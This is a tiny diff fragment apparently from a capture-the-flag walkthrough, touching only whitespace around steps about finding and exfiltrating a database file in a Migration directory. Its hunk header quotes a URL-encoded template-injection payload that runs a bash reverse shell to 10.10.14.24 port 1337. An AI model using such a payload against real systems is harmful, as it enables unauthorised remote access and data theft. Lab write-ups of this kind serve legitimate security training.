@@ -149,7 +149,6 @@ pwn%0a<%25%3d+system("bash+-c+'exec+bash+-i+>%26+/dev/tcp/10.10.14.24/1337+0>%26
 69adddfe701657e656b754bc7b3801d5
 ```
 
-
 19. Noticed there is a directory named **Migration**, inside it there's a DB file.
 20. Let's exfiltrate it.
 
